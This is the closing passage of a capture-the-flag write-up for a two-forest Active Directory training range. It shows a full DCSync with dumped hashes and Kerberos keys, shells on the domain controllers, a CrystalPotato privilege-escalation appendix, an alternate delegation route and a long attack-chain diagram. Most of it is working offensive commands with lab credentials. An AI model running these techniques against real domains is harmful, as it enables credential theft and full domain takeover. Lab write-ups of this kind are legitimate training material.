➜ env KRB5CCNAME='Administrator@cifs_dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM.ccache' \
secretsdump.py dc02.westbridge-research.hsm -k -no-pass -dc-ip 10.0.20.5 -just-dc
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

Administrator:500:aad3b435...:401138f45c010097b6a7b25eae9a6446:::
krbtgt:502:aad3b435...:cd83c3f7dfadf278326d4f6a51f9144e:::
...
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:cc9da2a4fbea735e4da2c0042b9cfec9a41b9ae80934f300638cd631d06174f3
WESTBRIDGE$:aes256-cts-hmac-sha1-96:26d1b12742077f1e44f677364ce7fbe5bc0b8e4874836a3d4bd058a1d0382478
```




**Full DCSync of WESTBRIDGE-RESEARCH.HSM** — every NT hash and Kerberos key, krbtgt included. Golden tickets for the research forest are now mintable at will.

Final approach with the Administrator AES key:

```bash
➜ getTGT.py westbridge-research.hsm/administrator \
    -aesKey 06a405bc0b070a460a77081b4a6ff16e8c1c79492d9fd2cab079cb5dab322f36 \
    -dc-ip 10.0.20.5

➜ env KRB5CCNAME=administrator.ccache \
evil_winrmexec -k dc02.westbridge-research.hsm -dc-ip 10.0.20.5

PS C:\Users\Administrator\Documents> whoami; hostname
wbresearch\administrator
DC02

PS > type ..\Desktop\root.txt
Flag07[DC_0wned_Mission_C0mplete]
```

**Flag 7 captured. Range complete — both forests, every host, every flag.**

| Host | Status | Flag |
|---|---|---|
| SQL 10.0.10.20 | SYSTEM | Flag01 |
| FILES 10.0.10.15 | local Admin | Flag02 |
| WEB 10.0.10.10 | root | Flag03 |
| HELPDESK-WS 10.0.10.25 | local admin | Flag04 |
| DC 10.0.10.5 | Domain Admin (ESC4) | Flag05 |
| WEB 10.0.20.10 | SYSTEM ➜ local Admin | Flag06 |
| **DC02 10.0.20.5** | **DA + full DCSync** | **Flag07** |


# Appendix A: The SeImpersonate Potato — CrystalPotato

> Crystal port of GodPotato to abuse SeImpersonatePrivilege with indirect syscalls, dynamic API resolution and compile-time string obfuscation. Run commands, reverse shells or add users

- https://ricardojoserf.github.io/crystalpotato/
- https://github.com/ricardojoserf/CrystalPotato

Both of Westbridge's Windows `SYSTEM` hops — SQL ([Section 10.6](#106-system-on-sql)) and the research web server ([Section 20.4](#204-webshell--crystalpotato--system)) — rode the same single primitive: **`SeImpersonatePrivilege` on a service account**. The whole "Potato" family (Rotten, Juicy, God, …) is one trick dressed in different binaries: a service process can impersonate any client it talks to, so you make the *service* talk to a named pipe or DCOM interface you control — SYSTEM connects, the service impersonates it, and `DuplicateTokenEx` hands you a SYSTEM token. No overflow, no CVE, just a Windows privilege working exactly as designed and pointed at itself.

The family matters only at the *edges*:

* **The primitive is the star.** Whether we ran it from the `svc_mssql` shell on SQL or the `iis apppool` webshell in the research forest, the escalation was identical — `SeImpersonatePrivilege: Enabled` in the token was the entire attack surface. Get a service context, and you've got a potato-shaped path to SYSTEM.
* **CrystalPotato is a Rust port of GodPotato.** Same coercion mechanics, but rebuilt with indirect syscalls, dynamic API resolution, and compile-time string obfuscation — so the binary itself doesn't light up static analysis and AV the way the original C# does.
* **Why Crystal here.** On the internal SQL box we didn't *need* the stealth; we needed a current, maintained tool that would land clean on Windows Server 2025, and CrystalPotato was that. On the research web server the obfuscation stopped being a luxury — Defender had already flagged the first plain webshell ([Section 20.4](#204-webshell--crystalpotato--system)), and a signature-heavy Potato would have met the same fate. One binary, two hosts, two threat models; the quiet one covered both.
* **Weapon vs meter.** Worth saying plainly: CrystalPotato was the *last meter*, never the door. It ran only after we already had a shell on the box. Every hop that actually moved the chain forward — the trusted header, the silver ticket, the OU relocations, the shadow credential — was abused mechanism, not exploit. That distinction is why this range is such a clean AD lab.

# Appendix B: The Road Not Taken — a.howard & DC02$

> BloodHound never showed us the edge we actually rode into DC02 (`WEB$` machine-account S4U rarely renders as a graph edge). What it *did* show, loudly, was **`A.HOWARD` — GenericWrite over `DC02$`** (plus `adminCount=True`). That is almost certainly the lab's designed route. We started down it, proved the first hops, then abandoned it because the `WEB$` path had already landed. Documented here so the next run can finish the job — everything below is from the raw session logs.

## B.1 The Evidence We Already Held

From the [Section 20.5](#lsa-secrets-the-machine-that-owns-dc02) LSA dump on research-WEB:

* `WESTBRIDGE-RESEARCH.HSM\a.howard : fdCgRAxJq0lY` — **plaintext**, stored by whatever service cached it. No cracking required.
* `$DCC2$10240#a.howard#06d655cd496c750af4211e7a47d3b9a2` — the domain-cache fallback if the plaintext hadn't been there (`hashcat -m 2100`).

## B.2 What Was Actually Tested

**Step 1 — TGT as a.howard ✅**

```bash
➜ getTGT.py westbridge-research.hsm/a.howard:'fdCgRAxJq0lY' -dc-ip 10.0.20.5
[*] Saving ticket in a.howard.ccache
```

**Step 2 — RBCD on DC02$ ✅** GenericWrite covers `msDS-AllowedToActOnBehalfOfOtherIdentity`, so a.howard can grant *any* account delegation rights against the DC:

```bash
➜ bloodyAD \
    --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
    -u 'a.howard' -k ccache=./a.howard.ccache \
    add rbcd 'DC02$' 'WEB$'
[!] No security descriptor has been returned, a new one will be created
[+] WEB$ can now impersonate users on DC02$ via S4U2Proxy
```

(Note what this proves about the intended chain: you don't even need a.howard to be the final delegate — its write primitive is enough to arm whichever machine account you control.)

**Step 3 — DCSync attempt ❌ (tooling, not technique)**

```bash
➜ secretsdump.py dc02.westbridge-research.hsm -k -no-pass -dc-ip 10.0.20.5 -just-dc
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN ...
```

This failed on session plumbing — `-k -no-pass` with no `KRB5CCNAME` exported picks up whatever default cache is lying around, and the DRSUAPI bind lands with a garbage DN context. The same secretsdump under `env KRB5CCNAME=Administrator@cifs_dc02...ccache` ([Section 20.6](#s4u-as-administrator-dcsync-flag07)) worked immediately. The fix: point the environment variable at a real ticket before blaming the protocol.

**Step 4 — exploration, then abandoned.** A `getST.py -impersonate Administrator -spn cifs/dc02...` run as a.howard went nowhere (a.howard holds no delegation trust — the RBCD grant belongs to `WEB$`, so *it* must run the S4U dance), and some ACL poking around `CN=Identity Security Operators` followed before the `WEB$` route closed the lab out. All of which means the cleanest version of the intended path was never executed:

```bash
# The two commands the lab probably wanted (untested, high confidence):
➜ env KRB5CCNAME=a.howard.ccache certipy shadow auto \
    -u 'a.howard@westbridge-research.hsm' -k -no-pass \
    -account 'DC02$' \
    -dc-host dc02.westbridge-research.hsm -dc-ip 10.0.20.5
# ➜ TGT as DC02$ + its NT hash

➜ env KRB5CCNAME=dc02.ccache secretsdump.py \
    'westbridge-research.hsm/DC02$'@dc02.westbridge-research.hsm \
    -k -no-pass -dc-ip 10.0.20.5 -just-dc
# ➜ full DCSync: a DC has replication rights over itself by default
```

## B.3 Status Table

| Hop | Status | Note |
|---|---|---|
| a.howard plaintext from LSA | ✅ proven | `fdCgRAxJq0lY` |
| TGT as a.howard | ✅ tested | |
| RBCD `WEB$ ➜ DC02$` via a.howard | ✅ tested | GenericWrite ⇒ delegation write |
| Shadow-cred directly on `DC02$` | ⬜ untested | likely the intended hop |
| DCSync as `DC02$` itself | ⬜ untested (failed once on ccache plumbing) | DCs replicate themselves by default |

**Lesson:** when BloodHound points somewhere you're not going, spend five minutes proving or disproving its route anyway — here the graph was right, the write primitive worked exactly as advertised, and only our own detour saved the lab from its intended ending.

## Attack Chain Summary

```
robots.txt ──▶ people-directory.conf.bak ──▶ X-Remote-User trusted
                                                      │
                                                      ▼
                                        Auth bypass on Flask :5000
                                                      │
                                                      ▼
                                     LDAP injection (/api/search)
                                                      │
                                                      ▼
                                            38 usernames dumped
                                                      │
                                                      ▼
                              AS-REP roast ──▶ svc_legacy (no preauth)
                                                      │           │
                                       crack fails ──┘           │
                                                      ▼          ▼
                          no-preauth cross-principal TGS abuse ◀─┘
                                                      │
                                    ┌─────────────────┼──────────────┐
                                    ▼                 ▼              ▼
                            krbtgt (AES)      svc_mssql (RC4)   svc_files/svc_krb_t2
                                              cracked: sqls3rv3r
                                                      │
                                                      ▼
                                   Valid creds on DC + FILES (SMB)
                                                      │
                                                      ▼
                                        BloodHound via bloodyAD
                                                      │
                          ┌───────────────┬───────────┼────────────────┐
                          ▼               ▼           ▼                ▼
                 RESEARCH forest    SQL$ + HELPDESK-WS$   svc_webmonitor   RID 9510
                  (trust abuse)      (hidden hosts)      ─shadow-cred➜    (= j.dillon!)
                                                             svc_files
                                                                  │
                                                                  ▼
                                                     S4U constrained del. ➜ FILES$

  SQL branch:
  silver ticket (svc_mssql RC4 key, PAC group 9497 injected)
        │
        ▼
  sysadmin ➜ xp_cmdshell ➜ shell as svc_mssql ➜ CrystalPotato
        │
        ▼
  SYSTEM on SQL ──▶ C:\backup\Westbridge.bak ──▶ restore ──▶ SQLManagement table
        │
        ▼
  m.thompson : Pa$$w0rd   (MD5 in DB; flagged "Administrator" by the People Directory app-role)
        │
        ▼
  OU abuse: move r.anderson/c.wilson into Students OU (GenericAll inherits)
        │
        ▼
  reset both passwords ➜ r.anderson opens Scripts share
        │
        ▼
  webserver_monitor.ps1 ➜ 3 FQDN targets ➜ dnstool hijack ➜ Responder
        │
        ▼
  svc_webmonitor : eazypassword   (NetNTLMv2 cracked)
        │
        ├─► certipy shadow auto: AddKeyCredentialLink ➜ PKINIT as svc_files
        │        └─► NT hash of svc_files recovered from TGT PAC
        │
        ▼
  getST -impersonate Administrator ➜ S4U2Self/S4U2Proxy ➜ HOST/FILES$
        │
        ▼
  FILES = local Admin (Pwn3d!) ──▶ SAM dump ──▶ evil-winrm ──▶ Flag02
        │
        ▼
  C:\IT-Share\Backup\WEB\id_ed25519  (SSH private key)
        │
        ▼
  SSH as svc_web@WEB (SSSD fqdn quirk) ──▶ cron hijack web_backup.sh ──▶ e.mitchell
        │
        ├─ Way #1: users.json bcrypt ➜ d.reynolds:Password123 ➜ sudo ALL ➜ root ➜ Flag03
        │
        └─ Way #2: m.thompson creates AD user "root" in Students OU
                       └─► kinit + ksu on WEB (SSSD maps root@REALM ➜ local root) ➜ Flag03

  Tier-2 branch:
  svc_krb_t2.keytab (from WEB root) ──► kinit -k ──► Kerberos as svc_krb_t2
        │
        ▼
  GenericAll on OU=IT Tier2 ──► reset s.harrison ──► STATUS_INVALID_LOGON_HOURS
        │
        ▼
  logonHours cleared (bloodyAD --raw, octet-string gotcha) ──► s.harrison valid
        │
        ▼
  s.harrison: HelpDesk Workstation Admins ──► WinRM (Pwn3d!) on HELPDESK-WS ──▶ Flag04
        │
        ▼
  domain_defaultPW.xml ──► Welcome2Westbridge! ──► a.pherson (STATUS_PASSWORD_MUST_CHANGE)
        │
        ▼
  kpasswd bypass (464) ──► a.pherson: SecretMyth123! ──► User Lifecycle Mgmt rights
        │
        ▼
  restore tombstones: j.dillon, t.dixon, a.collins (CN=Deleted Objects WRITE)
        │
        ▼
  j.dillon: GenericAll over IT TIER3 OU ──► shadow cred + reset a.owen
        │
        ▼
  a.owen ∈ CA-MANAGER  ◄── AD CS administration unlocked
        │
        ▼
  ESC4: SmartCardAuthentication template (WRITE/OWNER/DACL)
        │
        ▼
  msPKI-Certificate-Name-Flag: 0 ➜ 1 (ENROLLEE_SUPPLIES_SUBJECT)
        │
        ▼
  certipy req -upn administrator@westbridge.hsm ──► cert as Administrator
        │
        ▼
  certipy auth ──► Administrator NT hash ──► evil-winrm on DC ──▶ Flag05
        │
        ▼
  nxc --ntds: every hash incl. krbtgt ──► j.dillon IS RID 9510 (mystery closed)
        │            root:11601 = our AD "root"   ·   WBRESEARCH$:9518 = trust account
        ▼
  DC02 / RESEARCH forest pivot ◄── next stage
        │
        ▼
  Forest_Trust_Validation.eml ──► vault master password ships IN the memo
        │                          Database.kdb ──► researchoperator : XWkZ9o5T0c65djgYWl
        ▼
  (Kerberos-only forest — NTLM disabled)
        │
        ▼
  ligolo-ng via DC01 ──► 10.0.20.0/24 ──► dual-realm krb5.conf ──► cross-realm referral TGT
        │
        ▼
  Research Web Operations: Global ➜ Universal ➜ Domain Local (groupType surgery)
        │
        ▼
  researchoperator (foreign SID) joins the group ──► password-reset rights in RESEARCH
        │
        ▼
  reset r.parker + t.walker ──► RDP as r.parker on WEB(10.0.20.10) — local admin
        │
        ▼
  targetedkerberoast (t.walker GenericWrite) ──► j.bones : 8brokenbones8
        │
        ▼
  j.bones ∈ Research Web Admins ──► ASPX webshell (app pool) ──► CrystalPotato ──▶ SYSTEM
        │
        ▼
  Flag06 ──► LSA dump ──► WEB$ AES256 machine key
        │
        ▼
  S4U: WEB$ impersonate Administrator ──► cifs/DC02 ──► secretsdump -just-dc
        │
        ▼
  FULL DCSYNC of WESTBRIDGE-RESEARCH.HSM ──► evil-winrm DC02 ──▶ Flag07
        │
        ├─► research krbtgt AES256 + WESTBRIDGE$ inter-realm trust key
        │        └─► golden tickets & cross-realm forgery mintable at will
        └─► alt route (Appendix B): a.howard : fdCgRAxJq0lY  (plaintext, from LSA)
                 ├─► RBCD: WEB$ ➜ DC02$                    ✅ tested
                 └─► shadow-cred DC02$ ─► self-DCSync      ⬜ likely intended, untried

  Bonus loot from WEB root:
    /etc/svc_krb_t2.keytab ─► svc_krb_t2 Kerberos identity (no password needed)
         ├─► writable: OU=IT Tier2 (create/modify Tier-2 identities)
         └─► writable: DNS zone westbridge-research.hsm  ◄── cross-forest staging!
    /etc/krb5.keytab ─► HTTP/supportportal.westbridge.hsm  ◄── runs as WEB$; never attacked
  Bonus loot from research-WEB (LSA):
    WEB$ AES256 machine key ─► the S4U hop to DC02   ·   a.howard plaintext ─► Appendix B
```

## Closing Thoughts

This range is a masterclass in making a directory confess. The Flask bypass is a fun party trick, but the real lesson is [Section 7](#the-payoff-no-preauth-cross-principal-tgs-abuse) – [Section 20](#the-research-forest-falls): **a failed crack isn't a dead end — it's an attribute.** `svc_legacy`'s password surviving rockyou looked like a wall until you noticed what `UF_DONT_REQUIRE_PREAUTH` really buys: the KDC will impersonate that account on request, *for anyone*. One misconfigured flag became four TGS hashes — including `krbtgt`'s — and every stage after it ran the same play: find where a permission outlived its purpose (a deprecated vhost, a never-rotated keytab, a tombstoned Tier-3 admin, a writable certificate template, a group stuck mid-scope-conversion) and use it precisely.

Two techniques earn headline status on their own. The **silver ticket** ([Section 10](#pivot-the-hidden-sql-host)) turned "we can authenticate as `svc_mssql`" into "we are sysadmin" by writing a group RID into a PAC sealed with a key the domain had already handed us — no KDC contact, no IMPERSONATE grant, no humans involved until their own backup database surrendered one anyway. And **ESC4** ([Section 18](#privesc-dc01-esc4-on-the-ca)) proved AD CS is just a domain controller wearing a different hat: flip one bitmask bit on a writable template, enroll as Administrator via SAN, PKINIT for the real NT hash. The CA never malfunctioned; it issued exactly what the rewritten template told it to.

From m.thompson's OU move onward, nothing was *exploited* in the CVE sense — no initial-access exploit, no memory corruption, no public 1-day. The only thing resembling a named exploit in the entire chain, CrystalPotato, ran *after* we already owned the box, as a SeImpersonate privilege-escalation primitive on a host we had already landed on; it was the last meter, never the door. Everything before that was abused-mechanism chaining: passwords relocated by ACL inheritance, logon hours cleared with one attribute write, a workstation opened because a group said so — every hop was the domain's own permission model executing exactly as designed, just driven by someone it was never meant to let in. Even the "hardened" research forest (NTLM disabled, Kerberos-only) fell through its own trust, its own group scopes, and its own delegation settings. That makes Westbridge a near-perfect mirror of the OSCP exam mold: it isn't an OffSec box, but it trains the exact reflex that exam rewards — find where a permission outlived its purpose and use it precisely. Two forests, seven hosts, seven flags — and no zero-days. There didn't need to be.

**Mission complete: 7 flags · 2 forests · 7 hosts · full DCSync of both domains.**

Thanks to the HackSmarter team for the range. 🔥

---

## To Check

Open threads and loose ends from the run that were never fully closed — kept here so nothing useful is lost, not because the chain depended on them.

- **Silver-ticket SPN string (Section 10.5).** The forged ticket was minted for `MSSQLSvc/SQL.westbridge.hsm:1433`, but the nxc banner reported the registered SPN as `sql_mssql/SQL.westbridge.hsm`. The explanation (SQL never asks a KDC for SPN canonicality; it decrypts with its own key and reads the PAC) is sound in theory — but it's worth an empirical re-confirm: forge a ticket for a SPN *not* registered to `svc_mssql` at all and confirm SQL still accepts it. That's the cleanest proof of the KDC-invisibility claim.
- **SQL loot left on the table (Section 10.7).** The `Westbridge` restore exposed `LearningContent` and `StudentFinance` tables that were never `SELECT`ed, and the enabled `sa` login's hash was dumped but never cracked (`sys.sql_logins`). Both are legitimate alternate entry points if the silver-ticket route is unavailable.
- **LDAP relay window into DC01 (Section 1.2 / Section 10.3).** The DC's LDAP signing is `None` and `xp_dirtree` as `svc_mssql` proved a working coercion primitive. DC/FILES enforce SMB signing (SMB relay dead), but **LDAP** relay was open: `ntlmrelayx.py -t ldaps://dc.westbridge.hsm --delegate-access` after a PetitPotam/DFSCoerce against DC or FILES would have landed shadow-cred/RBCD on DC01 directly. Faster home-forest DA than the ADCS route; never chained because FILES fell first.
- **Support portal service account (Section 15.6).** `HTTP/supportportal.westbridge.hsm` authenticates as the `WEB$` machine account (same KVNOs in both keytabs). The portal *UI* was used over RDP, but the service itself — stored creds in its config, delegation settings, cert template — was never attacked. Kerberoasting the SPN just yields WEB$'s machine hash, which we already owned.
- **Autologon.exe on HELPDESK-WS (Section 16).** The helpdesk toolbox (`C:\Support\Tools`) ships `Autologon.exe`, which persists `DefaultUserName`/`DefaultPassword` in `HKLM\...\Winlogon`. Workstation images frequently store *domain* autologon credentials there — a possible identity with zero Kerberos abuse. Dump that key on a re-run.
- **KeePass vault not fully read (Section 19).** Only the `researchoperator` entry was pulled from `Database.kdb`. Labs seed extra entries (research-forest local admin, supportportal app login, service creds). `keepassxc-cli ls` the full tree before moving on.
- **Forest-level secrets held but unused (Section 20.6).** The inter-realm trust key of `WESTBRIDGE$` (`26d1b127…` AES256) and the research `krbtgt` AES256 (`cc9da2a4…`) were both dumped. Either forges cross-forest trust tickets (plain impersonation into the research forest — SID filtering blocks forged-SID tricks but not this) or research-forest golden tickets. The forest trust is *fully* owned, not just DC02.
- **a.howard — the intended DC02 path (Section 20).** BloodHound renders `A.HOWARD` with GenericWrite over `DC02$` + `adminCount=True` — almost certainly the lab's designed DC02 route (shadow-cred `DC02$` ➜ DCSync itself). We walked in via `WEB$` S4U2Proxy instead. a.howard is real (`RID 1113`, cleartext `fdCgRAxJq0lY` recovered from WEB LSA secrets), so the GenericWrite route is fully testable. A DCSync *as DC02$ itself* also works since DCs replicate by default.

- **CrystalPotato re-test (SeImpersonate privesc, Section 10.6 / Section 20.4).** Both `SYSTEM` hops used **CrystalPotato** — captured in `westbridge-webshell-potato-whoami.png`. On a re-run, swap in **GodPotato** (the C# original) to compare detection: same `SeImpersonatePrivilege` grant, same technique — the quieter Rust/obfuscated binary vs the loud original, and a useful evasion comparison worth a sentence in the writeup.
